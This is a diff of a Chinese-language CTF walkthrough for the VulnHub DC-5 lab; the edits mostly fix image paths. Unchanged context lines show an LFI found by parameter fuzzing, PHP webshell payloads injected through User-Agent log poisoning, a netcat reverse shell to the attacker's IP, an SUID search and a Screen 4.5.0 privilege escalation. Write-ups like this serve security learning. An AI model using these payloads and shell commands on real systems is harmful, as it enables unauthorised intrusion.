@@ -16,7 +16,7 @@ tag:
   - DC5
 comment: false
 
-
+typora-root-url: ..\..\..\..\.vuepress\public
 
 ---
 
@@ -52,7 +52,7 @@ nmap扫描网段
 nmap -sP 172.16.89.0/24
 ```
 
-![image-20211005093413765](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/image-20211005093413765.png)
+![image-20211005093413765](/assets/img/image-20211005093413765.png)
 
 发现靶机IP：172.16.89.6，继续扫描
 
@@ -144,27 +144,35 @@ Nmap done: 1 IP address (1 host up) scanned in 18.78 seconds
 
 发现80端口，浏览器访问页面，没有特殊组件，使用php
 
-![image-20211005093816521](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/image-20211005093816521.png)
+![image-20211005093816521](/assets/img/image-20211005093816521.png)
 
 ## 0x03 渗透
 
 访问页面，发现Contact下有一个提交表单，尝试没有sql注入，不管输入什么参数返回页面都是一样的，使用burp尝试get参数和值的猜测
 
-参数字典选择常见的 GET 参数字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api%26params/GET_params_Top99.txt
+参数字典选择常见的 GET 参数字典 : 
 
-参数值选择 Linux 的 LFI Payload 字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/LFI/LFI_Linux.txt
+```
+https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api%26params/GET_params_Top99.txt
+```
 
-![img](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/5.png)
+参数值选择 Linux 的 LFI Payload 字典 :
 
-![img](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/6.png)
+```
+https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/LFI/LFI_Linux.txt
+```
+
+![image-20211005093816521](/assets/img/image-20211005093816521-3412197.png)
+
+![6](/assets/img/6.png)
 
 很明显存在文件包含漏洞，观察发现可以包含nginx日志文件
 
-![img](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/7.png)
+![7](/assets/img/7.png)
 
 访问显示了日志内容
 
-![image-20211005094438514](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/image-20211005094438514.png)
+![image-20211005094438514](/assets/img/image-20211005094438514-3412234.png)
 
 可以进行日志中毒攻击，使用burp抓包，在 User-Agent: 中添加 payload: `<?php system($_GET['cmd']) ?>`，使用御剑连接失败，换<?php @eval($_POST['hacker']); ?>还是连接失败，怀疑有过滤，继续尝试
 
@@ -189,7 +197,7 @@ nc -nlvp 4444
 nc 172.16.89.2 4444 -e /bin/bash
 ```
 
-![image-20211005095333369](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/image-20211005095333369.png)
+![image-20211005095333369](/assets/img/image-20211005095333369.png)
 
 继续执行
 
@@ -208,7 +216,7 @@ export TERM=xterm
 find / -perm -u=s 2>/dev/null
 ```
 
-![img](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/11.png)
+![11](/assets/img/11.png)
 
 在 searchsploit 里找到了一个可以提权的，版本正好是 Screen 4.5.0
 
@@ -284,6 +292,6 @@ screen -ls
 whoami
 ```
 
-![img](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/12.png)
+![12](/assets/img/12.png)
 
-![img](/Users/liuhanzhe/Documents/fun_blog/docs/security/target/vulnhub/13.png)
+![13](/assets/img/13.png)
